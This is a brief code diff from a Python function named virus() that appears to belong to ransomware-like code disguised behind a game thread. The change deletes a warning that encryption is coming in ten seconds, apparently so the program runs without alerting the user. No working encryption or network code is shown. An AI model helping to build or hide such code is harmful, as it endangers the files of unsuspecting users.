@@ -20,8 +20,6 @@ def virus():
 		game_thread.start()
 		
 
-	print("ceypting coming in 10 seconds")
-	time.sleep(10)
 	directory = os.getcwd()
 	time.sleep(1)
 
